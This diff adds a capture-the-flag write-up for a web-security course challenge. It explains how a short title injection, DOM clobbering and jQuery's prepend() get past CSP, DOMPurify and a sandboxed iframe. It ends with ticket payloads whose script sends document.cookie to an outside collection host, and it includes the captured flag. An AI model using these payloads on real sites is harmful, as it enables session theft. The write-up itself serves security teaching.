@@ -507,3 +507,216 @@ style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
 img-src 'self' ssl.google-analytics.com;
 font-src fonts.gstatic.com maxcdn.bootstrapcdn.com
 ```
+
+## Support V2
+
+_This challenge took me 5 days, in 4 sittings to get. BUT I FINALLY DID IT._
+
+Site: support-v2.-QBSITE-
+
+Unlike `support.-QBSITE-`, this challenge has nothing to do with any base58 or IDOR enumeration.  
+Instead we're met with Content Security Policy roadblocks and sandboxed `iframes`.
+
+```
+Content-Security-Policy: script-src 'unsafe-eval' 'strict-dynamic' 'nonce-...'; base-uri 'none'; object-src 'none'
+```
+
+CSP Level 3 (`strict-dynamic`) is employed here, allowing only verified scripts to be executed.  
+
+* Material Design Lite (1.3.0)
+* JQuery (3.5.1)
+* DOMPurify (2.0.12)
+  
+All these libraries are the latest version (time of writing) - and do not have any _reported_ vulnerabilities.
+
+* The ticket body is encoded as b64, and is securely decoded with `atob`.
+* The `iframe` on the page has the `sandbox` attribute set without the `allow-scripts` permission. This will prevent any code from running inside the frame
+* Resources in an `iframe` inherit the CSP regulations of that frame's source as well as its parents
+* The page employs a `DOMPurify` script, that will strip away <s>every possible</s> most XSS payloads
+  * We either need to find an undetected pattern in DOMPurify, or bypass the library
+
+The contents inside `/report/[ticketID].js` (_Line 8_) can be tampered with by modifying the `ticketID`. However CSP is strictly set to `nonce` verification, rather than any `self` origin - and there doesn't seem to be any way to tamper with the headers
+
+```js
+// jquery is too hard. i copied this random piece of code from stackoverflow
+// it seems to be working. i don't know why, but at least it works
+// why was javascript invented
+setTimeout(function(){
+  sandbox = document.getElementById("tk").contentWindow;
+  div = document.createElement("div");
+  div.setAttribute("id", "rp");
+  div.innerHTML = "Found an issue? <a href=\"/report/[TICKETID]\">Report this page to admin</a>";
+  sandbox.document.body.appendChild(div);
+  $(sandbox.document.body).prepend(sandbox.rp);
+}, 1000);
+```
+
+So let's summarise our issues
+
+* CSP - strict-dynamic, nonce-based, iframe inheritance
+* Libraries - Up to date, secure (ish)
+* Ticket Body - Stored and decoded securely
+* DOMPurify - Sanitisation of XSS
+* iframe - Sandbox w/o script execution
+
+The first attack vector we can find is the **ticket title**.  
+The contents of the title are reflected verbosely into the response HTML, giving us partial control of the DOM.  
+It does however have a maximum length of 35 characters; not a lot, but enough!
+
+The title is located before the import of DOMPurify library and the sanitisation routine.  
+By injecting a `<script>` tag as the title, we render the HTML `script` tag which loads DOMPurify, as part of the Javascript code. This causes a CSP error, but more importantly - we've manipulated the DOM and prevented DOMPurify from loading!  
+
+The inline code block then decrypts the base64 ticket body and attempts to sanitise it.  
+However as we've removed DOMPurify from the page, the sanitisation fails and the script continues (thanks to the `try catch` block). This will cause the `srcdoc` of the iframe to contain an unsanitised ticket body!  
+
+But hang on... Our iframe code been nulled from our `<script>` injection, and it had sandboxing policies!  
+Well, since we've nulled it, we add a new iframe into our DOM, _without_ the sandbox!  
+We can control references to `#tk` to point to our new 'freed' `iframe`!
+
+Our header payload ends up as both the iframe and script opening tag.  
+It's 31 characters long, and so will fit the 35 character limit!
+
+```html
+<iframe id=tk></iframe><script>
+```
+
+With the header payload injected, we can see that the site looks exactly the same - except now our ticket body payload is executable and XSS-able!
+
+The next issue to face is bypassing CSP protection. Hm.  
+
+To execute a script, the script must contain the `nonce` value that is dynamically generated with each page visit.  
+With the ticket title payload, we could possibly keep the opening script tag unclosed, such that the `nonce` value inside the DOMPurify script tag would be added as an attribute - _however_ due to the structure of the elements this wasn't possible.  
+
+An `iframe` inherits the CSP policies of the parent document, meaning a resource (i.e script) must conform to the iframe's CSP policy, the iframe's parent's CSP policy, the iframe's parent's parent's CSP policy and so forth...  
+So executing a script in the `iframe` would not be possible, without already having access to Javascript to insert the nonce.
+
+The other way would be DOM Clobbering.  
+
+Some HTML elements allow us to override DOM properties.  
+<s>Horrible right?</s> Cool right!?
+
+* `<a>` tags resolve to their `href` value
+  * i.e. `<a id=id href=abc>` will cause `id + 'def' = 'abcdef'`
+* Tags with the same id will return a HTML Collection when accessed by their id 
+  * i.e. `<a id=a><a id=a name=b href=data>`
+  * `a` -> [a, a]
+  * `a.b` -> data
+* `<form>` tags allow us to build a multilevel dictionary
+* `<iframe srcdoc=...>` tags allow us to access HTML structures
+* `<img>` tags allow us to override `document.cookie` and `document.body`
+
+**Read More**
+
+* https://portswigger.net/web-security/dom-based/dom-clobbering
+* https://portswigger.net/research/dom-clobbering-strikes-back
+* [Even more](https://lmgtfy.com/?q=DOM+Clobbering)
+
+Cool, so we can perform DOM Clobbering. But on what?  
+Our requirements of DOM Clobbering is to not cause any Javascript syntax or runtime errors, so we won't be able to clobber the majority of the Javascript code.
+
+...
+
+This is where we go hackerman mode, and start auditing source code of libraries.  
+
+![](https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/d8328f77-2bec-4a20-9483-ea76dd62985e/dan31sc-80f18518-0ef0-4bdc-9c0a-11c9e62b769f.png/v1/fill/w_1192,h_670,q_70,strp/hackerman_by_shiiftyshift_dan31sc-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOiIsImlzcyI6InVybjphcHA6Iiwib2JqIjpbW3siaGVpZ2h0IjoiPD0xMDgwIiwicGF0aCI6IlwvZlwvZDgzMjhmNzctMmJlYy00YTIwLTk0ODMtZWE3NmRkNjI5ODVlXC9kYW4zMXNjLTgwZjE4NTE4LTBlZjAtNGJkYy05YzBhLTExYzllNjJiNzY5Zi5wbmciLCJ3aWR0aCI6Ijw9MTkyMCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.iBlOitqc4h2_YWFaG3IUb-UQ1MGU-V_M0azcwUwGUSI)
+
+Remember when I said that the libraries used in the site were up to date and secure?  
+Yeah well, they're _relatively_ secure.  
+
+There's a JQuery vulnerability test site [here](http://research.insecurelabs.org/jquery/test/) which reports JQuery 3.5.1 as safe against previously reported vulnerabilities. But ironically, JQuery is the library we are going to audit, because of the `unsafe-eval` directive in the CSP headers.
+
+`unsafe-eval` allows Javascript to be executed through `eval`.  
+JQuery requires this in order to perform it's DOM manipulation functions - when a `<script>` tag is added to the DOM via JQuery, the `nonce` values are appended automatically!
+
+The only JQuery code occurence that may have a attack vector possibility is inside the helper script.  
+`$(sandbox.document.body).prepend(sandbox.rp);`
+
+Hm, the `.prepend()` function... Let's take a look at that
+
+> Now's a good idea to open your Developer Tools, get another 3 monitors and fire up Burp Suite.
+
+Knowing that our end goal is to get Javascript execution from a `<script>` tag inside our ticket body, we can create our test payload
+
+Title Payload - `<iframe id=tk></iframe><script>`  
+Body Payload - `<script>alert('pwned!')</script>`
+
+We can then take a look at the JQuery script through the debugger in our Developer Tools.  
+
+> I recommend setting up Burp to change .min.js references to their verbose .js files
+
+The overall structure of the prepend function (concerning our exploit) is
+
+* `prepend()` function is called
+* `domManip()` function is called
+* `buildFragment()` function is called
+* Checks are done, and scripts are possibly executed
+
+By setting breakpoints around crucial code segments, we find the following requirements
+
+* A `<script>` tag must exist
+* `domManip:first` must be truthy (`fragment.firstChild`)
+* `!dataPriv.access(node, "globalEval")` must evaluate to `true`
+  * `dataPriv.access(node, "globalEval")` must evaluate to `false`
+* `buildFragment:attached` must evaluate to `false` (`isAttached(elem)`)
+
+Upon inspecting the state of the function, we find that `attached` evalutes to `true`, which prevents the script from being executed.
+
+The `isAttached` function checks if `elem` is inside `elem.ownerDocument`.  
+
+```
+# Expected DOM state for propery isAttached functionality
+
+<root / elem.ownerDocument>
+  <elem>
+```
+
+So ***finally***, to break this check we can perform DOM Clobbering and create a separate element that can be identified as `ownerDocument`.
+
+```
+# Desired DOM state for forced isAttached functionality
+
+<root>
+  <elem>
+    <ownerDocument>
+```
+
+As `elem.ownerDocument` is a child of `elem`, it will _not_ contain `elem`!
+
+We can form our payload as such
+
+```html
+<form id=rp>
+  <input name=ownerDocument>
+  <script>alert('pwned!')</script>
+```
+
+And tada! We've gotten Javascript execution!
+
+From here it's a simple task of sending off the `document.cookie` value to our endpoint.
+
+---
+
+**Ticket Title Payload**
+
+```
+<iframe id=tk></iframe><script>
+```
+
+**Ticket Body Payload**
+
+```html
+<form id=rp>
+  <input name=ownerDocument>
+  <script>fetch('https://my.collection.site?x=' + document.cookie)</script>
+```
+
+> `COMP6443{WOW_I_AM_IMPRESSED.ejUyMDY2Nzc=.1nt3n6lCZgj2Oln7THyzhg==}`
+
+
+**et cetera**
+
+* I set up my Burp Suite to change minified scripts to their verbose version - making debugging via the developer tools MUCH easier.
+* CSP can be set via a `<meta>` tag
+  * [Reading material](https://content-security-policy.com/examples/meta)
+  * This tag must appear in the `<head>` of a page
+* The DOM is confusing
